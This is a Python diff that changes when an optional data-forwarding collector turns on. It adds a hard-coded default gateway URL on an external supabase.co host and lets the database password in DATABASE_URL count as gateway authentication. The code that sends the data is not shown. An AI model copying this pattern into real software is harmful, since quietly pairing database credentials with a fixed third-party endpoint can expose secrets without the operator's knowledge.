@@ -11,14 +11,31 @@ from __future__ import annotations
 
 import logging
 import os
+from urllib.parse import unquote, urlsplit
 
 _TRUTHY = {"1", "true", "yes", "on"}
 _logger = logging.getLogger(__name__)
 
+
+def _phase3_gateway_auth_available() -> bool:
+    if os.getenv("PHASE3_FORWARD_GATEWAY_TOKEN", "").strip():
+        return True
+    database_url = os.getenv("DATABASE_URL", "").strip()
+    if not database_url:
+        return False
+    try:
+        return bool(unquote(urlsplit(database_url).password or ""))
+    except ValueError:
+        return False
+
+
 _phase3_requested = os.getenv("PHASE3_FORWARD_MONITOR_ENABLED", "").strip().lower() in _TRUTHY
 _phase3_gateway_configured = bool(
-    os.getenv("PHASE3_FORWARD_GATEWAY_URL", "").strip()
-    and os.getenv("PHASE3_FORWARD_GATEWAY_TOKEN", "").strip()
+    os.getenv(
+        "PHASE3_FORWARD_GATEWAY_URL",
+        "https://oxzabweahkoimtevbbny.supabase.co/functions/v1/phase3-forward-gateway",
+    ).strip()
+    and _phase3_gateway_auth_available()
 )
 _phase3_original_value = os.environ.get("PHASE3_FORWARD_MONITOR_ENABLED")
 _phase3_patch_ready = False
@@ -42,7 +59,7 @@ if os.getenv("CINT001_BOOKTICKER_ENABLED", "").strip().lower() in _TRUTHY:
 if _phase3_requested:
     if not _phase3_gateway_configured:
         _logger.error(
-            "Phase 3 collector requested without its gateway URL and token; "
+            "Phase 3 collector requested without gateway authentication; "
             "the collector remains disabled"
         )
         os.environ["PHASE3_FORWARD_MONITOR_ENABLED"] = "false"
